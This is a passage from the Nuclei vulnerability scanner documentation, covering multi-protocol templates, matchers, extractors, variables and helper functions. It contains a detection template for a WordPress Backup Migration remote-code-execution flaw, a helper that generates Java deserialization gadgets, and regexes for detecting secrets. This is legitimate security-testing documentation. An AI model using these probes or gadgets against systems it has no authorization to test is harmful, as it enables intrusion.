Lot of times just having arrays/slices is not enough and we might need to remove duplicate variables . for example in earlier vhost enumeration we did not remove any duplicates as there is always a chance of duplicate values in `ssl_subject_cn` and `ssl_subject_an` and this can be achieved by using `dedupe()` object. This is nuclei js helper function to abstract away boilerplate code of removing duplicates from array/slice

```
let uniq = new Dedupe(); // create new dedupe object
uniq.Add(template["ptrValue"]) 
uniq.Add(template["ssl_subject_cn"]);
uniq.Add(template["ssl_subject_an"]); 
log(uniq.Values())

```

And that’s it, this automatically converts any slice/array to map and removes duplicates from it and returns a slice/array of unique values

> Similar to DSL helper functions . we can either use built in functions available with `Javscript (ECMAScript 5.1)` or use DSL helper functions and its upto user to decide which one to uses.

### [​](#skip-internal-matchers-in-multiprotocol-flow-templates)Skip Internal Matchers in MultiProtocol / Flow Templates

Before nuclei v3.1.4 , A template like [`CVE-2023-43177`](https://github.com/projectdiscovery/nuclei-templates/blob/c5be73e328ebd9a0c122ea0324f60bbdd7eb940d/http/cves/2023/CVE-2023-43177.yaml#L28) which has multiple requests/protocols and uses `flow` for logic, used to only return one result but it conflicted with logic when `for` loop was used in `flow` to fix this nuclei engine from v3.1.4 will print all events/results in a template and template writers can use `internal: true` in matchers to skip printing of events/results just like dynamic extractors.

Note: this is only relevant if matchers/extractors are used in previous requests/protocols

Example of [`CVE-2023-6553`](https://github.com/projectdiscovery/nuclei-templates/blob/c5be73e328ebd9a0c122ea0324f60bbdd7eb940d/http/cves/2023/CVE-2023-6553.yaml#L21) with new `internal: true` logic would be

```
id: CVE-2023-6553

info:
  name: Worpress Backup Migration <= 1.3.7 - Unauthenticated Remote Code Execution
  author: FLX
  severity: critical

flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/backup-backup/readme.txt"

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "Backup Migration")'
        condition: and
        internal: true  # <- updated logic (this will skip printing this event/result)

  - method: POST
    path:
      - "{{BaseURL}}/wp-content/plugins/backup-backup/includes/backup-heart.php"
    headers:
      Content-Dir: "{{rand_text_alpha(10)}}"

    matchers:
      - type: dsl
        dsl:
          - 'len(body) == 0'
          - 'status_code == 200'
          - '!contains(body, "Incorrect parameters")'
        condition: and

```


Protocols

Multi-protocol
==============

Learn about multi-protocol support in Nuclei v3

Nuclei provides support for a variety of protocols including HTTP, DNS, Network, SSL, and Code. This allows users to write Nuclei templates for vulnerabilities across these protocols. However, there may be instances where a vulnerability requires the synchronous execution of multiple protocols for testing or exploitation. A prime example of this is **subdomain takeovers**, which necessitates a check for the CNAME record of a subdomain, followed by a verification of string in HTTP response. While this was partially achievable with workflows in Nuclei, the introduction of **Nuclei v3.0** has made it possible to conveniently write a **template** that can execute multiple protocols synchronously. This allows for checks to be performed on the results of each protocol, along with other enhancements.

**Example:**

```
id: dns-http-template

info:
  name: dns + http takeover template
  author: pdteam
  severity: info

dns:
  - name: "{{FQDN}}" # dns request
    type: cname

http:
  - method: GET # http request
    path:
      - "{{BaseURL}}"

    matchers:
      - type: dsl
        dsl:
          - contains(http_body,'Domain not found') # check for string from http response
          - contains(dns_cname, 'github.io') # check for cname from dns response
        condition: and

```

The example above demonstrates that there is no need for new logic or syntax. Simply write the logic for each protocol and then use the protocol-prefixed variable or the [dynamic extractor](https://docs.projectdiscovery.io/templates/reference/extractors#dynamic-extractor) to export that variable. This variable is then shared across all protocols. We refer to this as the **Template Context**, which contains all variables that are scoped at the template level.

[​](#features)Features
----------------------

The following features enhance the power of multi-protocol execution:

* Protocol-Scoped Shared Variables Across Protocols
* Data Export across Protocols using Dynamic Extractor

### [​](#protocol-scoped-variables)Protocol Scoped Variables

In the previous example, we demonstrated how to export the DNS CNAME and use it in an HTTP request. However, you might encounter a scenario where a template includes more than four protocols, and you need to export various response fields such as `subject_dn`, `ns`, `cname`, `header`, and so on. While you could achieve this by adding more dynamic extractors, this approach could clutter the template and introduce redundant logic, making it difficult to track and maintain all the variables.

To address this issue, multi-protocol execution supports template-scoped protocol responses. This means that all response fields from all protocols in a template are available in the template context with a protocol prefix.

Here’s an example to illustrate this:

| Protocol | Response Field | Exported Variable |
| --- | --- | --- |
| ssl | subject\_cn | ssl\_subject\_cn |
| dns | cname | dns\_cname |
| http | header | http\_header |
| code | response | code\_response |

This is just an example, but it’s important to note that the response fields of all protocols used in a multi-protocol template are exported.

**Example:**

```
id: dns-ssl-http-proto-prefix

info:
  name: multi protocol request with response fields
  author: pdteam
  severity: info

dns:
  - name: "{{FQDN}}" # DNS Request
    type: cname

ssl:
  - address: "{{Hostname}}" # ssl request

http:
  - method: GET # http request
    path:
      - "{{BaseURL}}"

    matchers:
      - type: dsl
        dsl:
          - contains(http_body,'ProjectDiscovery.io') # check for http string
          - trim_suffix(dns_cname,'.ghost.io.') == 'projectdiscovery' # check for cname (extracted information from dns response)
          - ssl_subject_cn == 'blog.projectdiscovery.io'
        condition: and

```

To list all exported response fields write a multi protocol template and run it with `-v -svd` flag and it will print all exported response fields

Example:

```
nuclei -t multi-protocol-template.yaml -u scanme.sh -debug -svd

```
### [​](#data-export-across-protocols)Data Export across Protocols

If you are unfamiliar with dynamic extractors, we recommend reading the [dynamic extractor](https://docs.projectdiscovery.io/templates/reference/extractors#dynamic-extractor) section first.

Previously, Dynamic Extractors were only supported for specific protocols or workflows. However, with multi-protocol execution, dynamically extracted values are stored in the template context and can be used across all protocols.

**Example:**

```
id: dns-http-template

info:
  name: dns + http takeover template
  author: pdteam
  severity: info

dns:
  - name: "{{FQDN}}" # dns request
    type: cname

    extractors:
      - type: dsl
        name: exported_cname
        dsl:
          - cname
        internal: true

http:
  - method: GET # http request
    path:
      - "{{BaseURL}}"

    matchers:
      - type: dsl
        dsl:
          - contains(body,'Domain not found') # check for http string
          - contains(exported_cname, 'github.io') # check for cname (extracted information from dns response)
        condition: and

```

[​](#how-multi-protocol-works)How Multi Protocol Works?
-------------------------------------------------------

At this point we have seen how multi protocol templates look like and what are the features it brings to the table. Now let’s see how multi protocol templates work and things to keep in mind while writing them.

* Multi Protocol Templates are executed in order of protocols defined in template.
* Protocols in multi protocol templates are executed in serial i.e one after another.
* Response fields of protocols are exported to template context as soon as that protocol is executed.
* Variables are scoped at template level and evaluated after each protocol execution.
* Multi protocol brings limited indirect support for preprocessing(using variables) and postprocessing(using dynamic extractors) for protocols.

[​](#faq)FAQ
------------

**What Protocols are supported in Multi-Protocol Execution Mode?**

> There is no restriction around any protocol and any protocol available/implemented in nuclei engine can be used in multi protocol templates

**How many protocols can be used in Multi-Protocol Execution Mode?**

> There is no restriction around number of protocols but currently duplicated protocols are not supported i.e dns -> http -> ssl -> http. Please open a issue if you have a vulnerabilty/usecase that requires duplicated protocols

**What happens if a protocol fails?**

> Multi Protocol Execution follows exit on error policy i.e if protocol fails to execute then execution of remaining protocols is skipped and template execution is stopped

**How is multi protocol execution different from workflows?**

> Workflow as name suggest is a workflow that executes templates based on workflow file
> 
> * Workflow does not contain actual logic of vulnerability but just a workflow that executes different templates
> * Workflow supports conditional execution of multiple templates
> * Workflow has limited supported for variables and dynamic extractors

To summarize workflow is a step higher than template and manages execution of templates based on workflow file

**Is multi protocol execution supported in nuclei v2?**

> No, Multi Protocol Execution is only supported in nuclei v3 and above



---

# Reference

Reference

Matchers
========

Review details on matchers for Nuclei

Matchers allow different type of flexible comparisons on protocol responses. They are what makes nuclei so powerful, checks are very simple to write and multiple checks can be added as per need for very effective scanning.

### [​](#types)Types

Multiple matchers can be specified in a request. There are basically 7 types of matchers:

| Matcher Type | Part Matched |
| --- | --- |
| status | Integer Comparisons of Part |
| size | Content Length of Part |
| word | Part for a protocol |
| regex | Part for a protocol |
| binary | Part for a protocol |
| dsl | Part for a protocol |
| xpath | Part for a protocol |

To match status codes for responses, you can use the following syntax.

```
matchers:
  # Match the status codes
  - type: status
    # Some status codes we want to match
    status:
      - 200
      - 302

```

To match binary for hexadecimal responses, you can use the following syntax.

```
matchers:
  - type: binary
    binary:
      - "504B0304" # zip archive
      - "526172211A070100" # RAR archive version 5.0
      - "FD377A585A0000" # xz tar.xz archive
    condition: or
    part: body

```

Matchers also support hex encoded data which will be decoded and matched.

```
matchers:
  - type: word
    encoding: hex
    words:
      - "50494e47"
    part: body

```

**Word** and **Regex** matchers can be further configured depending on the needs of the users.

**XPath** matchers use XPath queries to match XML and HTML responses. If the XPath query returns any results, it’s considered a match.

```
matchers:
  - type: xpath
    part: body
    xpath:
      - "/html/head/title[contains(text(), 'Example Domain')]"

```

Complex matchers of type **dsl** allows building more elaborate expressions with helper functions. These function allow access to Protocol Response which contains variety of data based on each protocol. See protocol specific documentation to learn about different returned results.

```
matchers:
  - type: dsl
    dsl:
      - "len(body)<1024 && status_code==200" # Body length less than 1024 and 200 status code
      - "contains(toupper(body), md5(cookie))" # Check if the MD5 sum of cookies is contained in the uppercase body

```

Every part of a Protocol response can be matched with DSL matcher. Some examples -

| Response Part | Description | Example |
| --- | --- | --- |
| content\_length | Content-Length Header | content\_length >= 1024 |
| status\_code | Response Status Code | status\_code==200 |
| all\_headers | Unique string containing all headers | len(all\_headers) |
| body | Body as string | len(body) |
| header\_name | Lowercase header name with `-` converted to `_` | len(user\_agent) |
| raw | Headers + Response | len(raw) |

### [​](#conditions)Conditions

Multiple words and regexes can be specified in a single matcher and can be configured with different conditions like **AND** and **OR**.

1. **AND** - Using AND conditions allows matching of all the words from the list of words for the matcher. Only then will the request be marked as successful when all the words have been matched.
2. **OR** - Using OR conditions allows matching of a single word from the list of matcher. The request will be marked as successful when even one of the word is matched for the matcher.

### [​](#matched-parts)Matched Parts

Multiple parts of the response can also be matched for the request, default matched part is `body` if not defined.

Example matchers for HTTP response body using the AND condition:

```
matchers:
  # Match the body word
  - type: word
   # Some words we want to match
   words:
     - "[core]"
     - "[config]"
   # Both words must be found in the response body
   condition: and
   #  We want to match request body (default)
   part: body

```

Similarly, matchers can be written to match anything that you want to find in the response body allowing unlimited creativity and extensibility.

### [​](#negative-matchers)Negative Matchers

All types of matchers also support negative conditions, mostly useful when you look for a match with an exclusions. This can be used by adding `negative: true` in the **matchers** block.

Here is an example syntax using `negative` condition, this will return all the URLs not having `PHPSESSID` in the response header.

```
matchers:
  - type: word
    words:
      - "PHPSESSID"
    part: header
    negative: true

```
### [​](#multiple-matchers)Multiple Matchers

Multiple matchers can be used in a single template to fingerprint multiple conditions with a single request.

Here is an example of syntax for multiple matchers.

```
matchers:
  - type: word
    name: php
    words:
      - "X-Powered-By: PHP"
      - "PHPSESSID"
    part: header
  - type: word
    name: node
    words:
      - "Server: NodeJS"
      - "X-Powered-By: nodejs"
    condition: or
    part: header
  - type: word
    name: python
    words:
      - "Python/2."
      - "Python/3."
    condition: or
    part: header

```
### [​](#matchers-condition)Matchers Condition

While using multiple matchers the default condition is to follow OR operation in between all the matchers, AND operation can be used to make sure return the result if all matchers returns true.

```
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "X-Powered-By: PHP"
          - "PHPSESSID"
        condition: or
        part: header

      - type: word
        words:
          - "PHP"
        part: body

```
### [​](#internal-matchers)Internal Matchers

When writing multi-protocol or `flow` based templates, there might be a case where we need to validate/match first request then proceed to next request and a good example of this is [`CVE-2023-6553`](https://github.com/projectdiscovery/nuclei-templates/blob/c5be73e328ebd9a0c122ea0324f60bbdd7eb940d/http/cves/2023/CVE-2023-6553.yaml#L21)

In this template, we are first checking if target is actual using `Backup Migration` plugin using matchers and if true then proceed to next request with help of `flow`

But this will print two results, one for each request match since we are using the first request matchers as a pre-condition to proceed to next request we can mark it as internal using `internal: true` in the matchers block.

```
id: CVE-2023-6553

info:
  name: Worpress Backup Migration <= 1.3.7 - Unauthenticated Remote Code Execution
  author: FLX
  severity: critical

flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/backup-backup/readme.txt"

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "Backup Migration")'
        condition: and
        internal: true  # <- updated logic (this will skip printing this event/result)

  - method: POST
    path:
      - "{{BaseURL}}/wp-content/plugins/backup-backup/includes/backup-heart.php"
    headers:
      Content-Dir: "{{rand_text_alpha(10)}}"

    matchers:
      - type: dsl
        dsl:
          - 'len(body) == 0'
          - 'status_code == 200'
          - '!contains(body, "Incorrect parameters")'
        condition: and

```
### [​](#global-matchers)Global Matchers

Global matchers are essentially `matchers` that apply globally across all HTTP responses received from running other templates. This makes them super useful for things like passive detection, fingerprinting, spotting errors, WAF detection, identifying unusual behaviors, or even catching secrets and information leaks. By setting `global-matchers` to **true**, you’re enabling the template to automatically match events triggered by other templates without having to configure them individually.

* Global matchers only work with [HTTP-protocol-based](/templates/protocols/http) templates.
* When global matchers are enabled, no requests defined in the template will be sent.
* This feature is not limited to `matchers`; you can also define `extractors` in a global matchers template.

Let’s look at a quick example of how this works:

```
# http-template-with-global-matchers.yaml
http:
  - global-matchers: true
    matchers-condition: or
    matchers:
      - type: regex
        name: asymmetric_private_key
        regex:
          - '-----BEGIN ((EC|PGP|DSA|RSA|OPENSSH) )?PRIVATE KEY( BLOCK)?-----'
        part: body

      - type: regex
        name: slack_webhook
        regex:
          - >-
            https://hooks.slack.com/services/T[a-zA-Z0-9_]{8,10}/B[a-zA-Z0-9_]{8,12}/[a-zA-Z0-9_]{23,24}
        part: body

```

In this example, we’re using a template that has `global-matchers` set to **true**. It looks for specific patterns, like an asymmetric private key or a Slack webhook, across all HTTP requests. Now, when you run this template along with others, the global matcher will automatically check for those patterns in all HTTP responses. You don’t have to set up individual matchers in every single template for it to work.

To run it, use a command like this:

```
> nuclei -egm -u http://example.com -t http-template-with-global-matchers.yaml -t http-template-1.yaml -t http-template-2.yaml -silent
[http-template-with-global-matchers:asymmetric_private_key] http://example.com/request-from-http-template-1
[http-template-with-global-matchers:slack_webhook] http://example.com/request-from-http-template-2

```

Global matchers are NOT applied by default. You need to explicitly enable them using the `-enable-global-matchers`/`-egm` flag or programmatically via [`nuclei.EnableGlobalMatchersTemplates`](https://pkg.go.dev/github.com/projectdiscovery/nuclei/v3/lib#EnableGlobalMatchersTemplates) if you’re working with the Nuclei SDK.

In this case, the global matchers are looking for an asymmetric private key and a Slack webhook. As you can see in the output, it found a match in requests from the other templates, even though the matching logic was only defined once in the global matchers template. This makes it really efficient for detecting patterns across multiple requests without duplicating code in every single template.


Reference

Extractors
==========

Review details on extractors for Nuclei

Extractors can be used to extract and display in results a match from the response returned by a module.

### [​](#types)Types

Multiple extractors can be specified in a request. As of now we support five type of extractors.

1. **regex** - Extract data from response based on a Regular Expression.
2. **kval** - Extract `key: value`/`key=value` formatted data from Response Header/Cookie
3. **json** - Extract data from JSON based response in JQ like syntax.
4. **xpath** - Extract xpath based data from HTML Response
5. **dsl** - Extract data from the response based on a DSL expressions.

### [​](#regex-extractor)Regex Extractor

Example extractor for HTTP Response body using **regex** -

```
extractors:
  - type: regex # type of the extractor
    part: body  # part of the response (header,body,all)
    regex:
      - "(A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}"  # regex to use for extraction.

```
### [​](#kval-extractor)Kval Extractor

A **kval** extractor example to extract `content-type` header from HTTP Response.

```
extractors:
  - type: kval # type of the extractor
    kval:
      - content_type # header/cookie value to extract from response

```

Note that `content-type` has been replaced with `content_type` because **kval** extractor does not accept dash (`-`) as input and must be substituted with underscore (`_`).

### [​](#json-extractor)JSON Extractor

A **json** extractor example to extract value of `id` object from JSON block.

```
      - type: json # type of the extractor
        part: body
        name: user
        json:
          - '.[] | .id'  # JQ like syntax for extraction

```

For more details about JQ - <https://github.com/stedolan/jq>

### [​](#xpath-extractor)Xpath Extractor

A **xpath** extractor example to extract value of `href` attribute from HTML response.

```
extractors:
  - type: xpath # type of the extractor
    attribute: href # attribute value to extract (optional)
    xpath:
      - '/html/body/div/p[2]/a' # xpath value for extraction

```

With a simple [copy paste in browser](https://www.scientecheasy.com/2020/07/find-xpath-chrome.html/), we can get the **xpath** value form any web page content.

### [​](#dsl-extractor)DSL Extractor

A **dsl** extractor example to extract the effective `body` length through the `len` helper function from HTTP Response.

```
extractors:
  - type: dsl  # type of the extractor
    dsl:
      - len(body) # dsl expression value to extract from response

```
### [​](#dynamic-extractor)Dynamic Extractor

Extractors can be used to capture Dynamic Values on runtime while writing Multi-Request templates. CSRF Tokens, Session Headers, etc. can be extracted and used in requests. This feature is only available in RAW request format.

Example of defining a dynamic extractor with name `api` which will capture a regex based pattern from the request.

```
    extractors:
      - type: regex
        name: api
        part: body
        internal: true # Required for using dynamic variables
        regex:
          - "(?m)[0-9]{3,10}\\.[0-9]+"

```

The extracted value is stored in the variable **api**, which can be utilised in any section of the subsequent requests.

If you want to use extractor as a dynamic variable, you must use `internal: true` to avoid printing extracted values in the terminal.

An optional regex **match-group** can also be specified for the regex for more complex matches.

```
extractors:
  - type: regex  # type of extractor
    name: csrf_token # defining the variable name
    part: body # part of response to look for
    # group defines the matching group being used. 
    # In GO the "match" is the full array of all matches and submatches 
    # match[0] is the full match
    # match[n] is the submatches. Most often we'd want match[1] as depicted below
    group: 1
    regex:
      - '<input\sname="csrf_token"\stype="hidden"\svalue="([[:alnum:]]{16})"\s/>'

```

The above extractor with name `csrf_token` will hold the value extracted by `([[:alnum:]]{16})` as `abcdefgh12345678`.

If no group option is provided with this regex, the above extractor with name `csrf_token` will hold the full match (by `<input name="csrf_token"\stype="hidden"\svalue="([[:alnum:]]{16})" />`) as `<input name="csrf_token" type="hidden" value="abcdefgh12345678" />`.

### [​](#reusable-dynamic-extractors)Reusable Dynamic Extractors

With Nuclei v3.1.4 you can now reuse dynamic extracted value (ex: csrf\_token in above example) immediately in next extractors and is by default available in subsequent requests

Example:

```
id: basic-raw-example

info:
  name: Test RAW Template
  author: pdteam
  severity: info


http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        name: title
        group: 1
        regex:
          - '<title>(.*)<\/title>'
        internal: true

      - type: dsl
        dsl:
          - '"Title is " + title'

```


Reference

Variables
=========

Review details on variables for Nuclei

Variables can be used to declare some values which remain constant throughout the template. The value of the variable once calculated does not change. Variables can be either simple strings or DSL helper functions. If the variable is a helper function, it is enclosed in double-curly brackets `{{<expression>}}`. Variables are declared at template level.

Example variables -

```
variables:
  a1: "test" # A string variable
  a2: "{{to_lower(rand_base(5))}}" # A DSL function variable

```

Currently, `dns`, `http`, `headless` and `network` protocols support variables.

Example of templates with variables -

```
# Variable example using HTTP requests
id: variables-example

info:
  name: Variables Example
  author: pdteam
  severity: info

variables:
  a1: "value"
  a2: "{{base64('hello')}}"

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{FQDN}}
        Test: {{a1}}
        Another: {{a2}}
    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: word
        words: 
          - "value"
          - "aGVsbG8="

```

```
# Variable example for network requests
id: variables-example

info:
  name: Variables Example
  author: pdteam
  severity: info

variables:
  a1: "PING"
  a2: "{{base64('hello')}}"

tcp:
  - host: 
      - "{{Hostname}}"
    inputs:
      - data: "{{a1}}"
    read-size: 8
    matchers:
      - type: word
        part: data
        words:
          - "{{a2}}"

```


Reference

Helper Functions
================

Review details on helper functions for Nuclei

Here is the list of all supported helper functions can be used in the RAW requests / Network requests.

| Helper function | Description | Example | Output |
| --- | --- | --- | --- |
| aes\_gcm(key, plaintext interface) []byte | AES GCM encrypts a string with key | `{{hex_encode(aes_gcm("AES256Key-32Characters1234567890", "exampleplaintext"))}}` | `ec183a153b8e8ae7925beed74728534b57a60920c0b009eaa7608a34e06325804c096d7eebccddea3e5ed6c4` |
| base64(src interface) string | Base64 encodes a string | `base64("Hello")` | `SGVsbG8=` |
| base64\_decode(src interface) []byte | Base64 decodes a string | `base64_decode("SGVsbG8=")` | `Hello` |
| base64\_py(src interface) string | Encodes string to base64 like python (with new lines) | `base64_py("Hello")` | `SGVsbG8=\n` |
| bin\_to\_dec(binaryNumber number | string) float64 | Transforms the input binary number into a decimal format | `bin_to_dec("0b1010")``bin_to_dec(1010)` | `10` |
| compare\_versions(versionToCheck string, constraints …string) bool | Compares the first version argument with the provided constraints | `compare_versions('v1.0.0', '\>v0.0.1', '\<v1.0.1')` | `true` |
| concat(arguments …interface) string | Concatenates the given number of arguments to form a string | `concat("Hello", 123, "world)` | `Hello123world` |
| contains(input, substring interface) bool | Verifies if a string contains a substring | `contains("Hello", "lo")` | `true` |
| contains\_all(input interface, substrings …string) bool | Verifies if any input contains all of the substrings | `contains("Hello everyone", "lo", "every")` | `true` |
| contains\_any(input interface, substrings …string) bool | Verifies if an input contains any of substrings | `contains("Hello everyone", "abc", "llo")` | `true` |
| date\_time(dateTimeFormat string, optionalUnixTime interface) string | Returns the formatted date time using simplified or `go` style layout for the current or the given unix time | `date_time("%Y-%M-%D %H:%m")``date_time("%Y-%M-%D %H:%m", 1654870680)``date_time("2006-01-02 15:04", unix_time())` | `2022-06-10 14:18` |
| dec\_to\_hex(number number | string) string | Transforms the input number into hexadecimal format | `dec_to_hex(7001)"` | `1b59` |
| ends\_with(str string, suffix …string) bool | Checks if the string ends with any of the provided substrings | `ends_with("Hello", "lo")` | `true` |
| generate\_java\_gadget(gadget, cmd, encoding interface) string | Generates a Java Deserialization Gadget | `generate_java_gadget("dns", "{{interactsh-url}}", "base64")` | `rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAAHQAAHEAfgAFdAAFcHh0ACpjYWhnMmZiaW41NjRvMGJ0MHRzMDhycDdlZXBwYjkxNDUub2FzdC5mdW54` |
| generate\_jwt(json, algorithm, signature, unixMaxAge) []byte | Generates a JSON Web Token (JWT) using the claims provided in a JSON string, the signature, and the specified algorithm | `generate_jwt("{\"name\":\"John Doe\",\"foo\":\"bar\"}", "HS256", "hello-world")` | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmb28iOiJiYXIiLCJuYW1lIjoiSm9obiBEb2UifQ.EsrL8lIcYJR_Ns-JuhF3VCllCP7xwbpMCCfHin_WT6U` |
| gzip(input string) string | Compresses the input using GZip | `base64(gzip("Hello"))` | `+H4sIAAAAAAAA//JIzcnJBwQAAP//gonR9wUAAAA=` |
| gzip\_decode(input string) string | Decompresses the input using GZip | `gzip_decode(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"))` | `Hello` |
| hex\_decode(input interface) []byte | Hex decodes the given input | `hex_decode("6161")` | `aa` |
| hex\_encode(input interface) string | Hex encodes the given input | `hex_encode("aa")` | `6161` |
| hex\_to\_dec(hexNumber number | string) float64 | Transforms the input hexadecimal number into decimal format | `hex_to_dec("ff")``hex_to_dec("0xff")` | `255` |
| hmac(algorithm, data, secret) string | hmac function that accepts a hashing function type with data and secret | `hmac("sha1", "test", "scrt")` | `8856b111056d946d5c6c92a21b43c233596623c6` |
| html\_escape(input interface) string | HTML escapes the given input | `html_escape("\<body\>test\</body\>")` | `&lt;body&gt;test&lt;/body&gt;` |
| html\_unescape(input interface) string | HTML un-escapes the given input | `html_unescape("&lt;body&gt;test&lt;/body&gt;")` | `\<body\>test\</body\>` |
| join(separator string, elements …interface) string | Joins the given elements using the specified separator | `join("_", 123, "hello", "world")` | `123_hello_world` |
| json\_minify(json) string | Minifies a JSON string by removing unnecessary whitespace | `json_minify("{ \"name\": \"John Doe\", \"foo\": \"bar\" }")` | `{"foo":"bar","name":"John Doe"}` |
| json\_prettify(json) string | Prettifies a JSON string by adding indentation | `json_prettify("{\"foo\":\"bar\",\"name\":\"John Doe\"}")` | `{\n \"foo\": \"bar\",\n \"name\": \"John Doe\"\n}` |
| len(arg interface) int | Returns the length of the input | `len("Hello")` | `5` |
| line\_ends\_with(str string, suffix …string) bool | Checks if any line of the string ends with any of the provided substrings | `line_ends_with("Hello\nHi", "lo")` | `true` |
| line\_starts\_with(str string, prefix …string) bool | Checks if any line of the string starts with any of the provided substrings | `line_starts_with("Hi\nHello", "He")` | `true` |
| md5(input interface) string | Calculates the MD5 (Message Digest) hash of the input | `md5("Hello")` | `8b1a9953c4611296a827abf8c47804d7` |
| mmh3(input interface) string | Calculates the MMH3 (MurmurHash3) hash of an input | `mmh3("Hello")` | `316307400` |
| oct\_to\_dec(octalNumber number | string) float64 | Transforms the input octal number into a decimal format | `oct_to_dec("0o1234567")``oct_to_dec(1234567)` | `342391` |
| print\_debug(args …interface) | Prints the value of a given input or expression. Used for debugging. | `print_debug(1+2, "Hello")` | `3 Hello` |
| rand\_base(length uint, optionalCharSet string) string | Generates a random sequence of given length string from an optional charset (defaults to letters and numbers) | `rand_base(5, "abc")` | `caccb` |
| rand\_char(optionalCharSet string) string | Generates a random character from an optional character set (defaults to letters and numbers) | `rand_char("abc")` | `a` |
| rand\_int(optionalMin, optionalMax uint) int | Generates a random integer between the given optional limits (defaults to 0 - MaxInt32) | `rand_int(1, 10)` | `6` |
| rand\_text\_alpha(length uint, optionalBadChars string) string | Generates a random string of letters, of given length, excluding the optional cutset characters | `rand_text_alpha(10, "abc")` | `WKozhjJWlJ` |
| rand\_text\_alphanumeric(length uint, optionalBadChars string) string | Generates a random alphanumeric string, of given length without the optional cutset characters | `rand_text_alphanumeric(10, "ab12")` | `NthI0IiY8r` |
| rand\_ip(cidr …string) string | Generates a random IP address | `rand_ip("192.168.0.0/24")` | `192.168.0.171` |
| rand\_text\_numeric(length uint, optionalBadNumbers string) string | Generates a random numeric string of given length without the optional set of undesired numbers | `rand_text_numeric(10, 123)` | `0654087985` |
| regex(pattern, input string) bool | Tests the given regular expression against the input string | `regex("H([a-z]+)o", "Hello")` | `true` |
| remove\_bad\_chars(input, cutset interface) string | Removes the desired characters from the input | `remove_bad_chars("abcd", "bc")` | `ad` |
| repeat(str string, count uint) string | Repeats the input string the given amount of times | `repeat("../", 5)` | `../../../../../` |
| replace(str, old, new string) string | Replaces a given substring in the given input | `replace("Hello", "He", "Ha")` | `Hallo` |
| replace\_regex(source, regex, replacement string) string | Replaces substrings matching the given regular expression in the input | `replace_regex("He123llo", "(\\d+)", "")` | `Hello` |
| reverse(input string) string | Reverses the given input | `reverse("abc")` | `cba` |
| sha1(input interface) string | Calculates the SHA1 (Secure Hash 1) hash of the input | `sha1("Hello")` | `f7ff9e8b7bb2e09b70935a5d785e0cc5d9d0abf0` |
| sha256(input interface) string | Calculates the SHA256 (Secure Hash 256) hash of the input | `sha256("Hello")` | `185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969` |
| starts\_with(str string, prefix …string) bool | Checks if the string starts with any of the provided substrings | `starts_with("Hello", "He")` | `true` |
| to\_lower(input string) string | Transforms the input into lowercase characters | `to_lower("HELLO")` | `hello` |
| to\_unix\_time(input string, layout string) int | Parses a string date time using default or user given layouts, then returns its Unix timestamp | `to_unix_time("2022-01-13T16:30:10+00:00")``to_unix_time("2022-01-13 16:30:10")``to_unix_time("13-01-2022 16:30:10", "02-01-2006 15:04:05")` | `1642091410` |
| to\_upper(input string) string | Transforms the input into uppercase characters | `to_upper("hello")` | `HELLO` |
| trim(input, cutset string) string | Returns a slice of the input with all leading and trailing Unicode code points contained in cutset removed | `trim("aaaHelloddd", "ad")` | `Hello` |
| trim\_left(input, cutset string) string | Returns a slice of the input with all leading Unicode code points contained in cutset removed | `trim_left("aaaHelloddd", "ad")` | `Helloddd` |
| trim\_prefix(input, prefix string) string | Returns the input without the provided leading prefix string | `trim_prefix("aaHelloaa", "aa")` | `Helloaa` |
| trim\_right(input, cutset string) string | Returns a string, with all trailing Unicode code points contained in cutset removed | `trim_right("aaaHelloddd", "ad")` | `aaaHello` |
| trim\_space(input string) string | Returns a string, with all leading and trailing white space removed, as defined by Unicode | `trim_space(" Hello ")` | `"Hello"` |
| trim\_suffix(input, suffix string) string | Returns input without the provided trailing suffix string | `trim_suffix("aaHelloaa", "aa")` | `aaHello` |
| unix\_time(optionalSeconds uint) float64 | Returns the current Unix time (number of seconds elapsed since January 1, 1970 UTC) with the added optional seconds | `unix_time(10)` | `1639568278` |
| url\_decode(input string) string | URL decodes the input string | `url_decode("https:%2F%2Fprojectdiscovery.io%3Ftest=1")` | `https://projectdiscovery.io?test=1` |
| url\_encode(input string) string | URL encodes the input string | `url_encode("https://projectdiscovery.io/test?a=1")` | `https%3A%2F%2Fprojectdiscovery.io%2Ftest%3Fa%3D1` |
| wait\_for(seconds uint) | Pauses the execution for the given amount of seconds | `wait_for(10)` | `true` |
| zlib(input string) string | Compresses the input using Zlib | `base64(zlib("Hello"))` | `eJzySM3JyQcEAAD//wWMAfU=` |
| zlib\_decode(input string) string | Decompresses the input using Zlib | `zlib_decode(hex_decode("789cf248cdc9c907040000ffff058c01f5"))` | `Hello` |
| resolve(host string, format string) string | Resolves a host using a dns type that you define | `resolve("localhost",4)` | `127.0.0.1` |
| ip\_format(ip string, format string) string | It takes an input ip and converts it to another format according to this [legend](https://github.com/projectdiscovery/mapcidr/wiki/IP-Format-Index), the second parameter indicates the conversion index and must be between 1 and 11 | `ip_format("127.0.0.1", 3)` | `0177.0.0.01` |

[​](#deserialization-helper-functions)Deserialization helper functions
----------------------------------------------------------------------

Nuclei allows payload generation for a few common gadget from [ysoserial](https://github.com/frohoff/ysoserial).

**Supported Payload:**

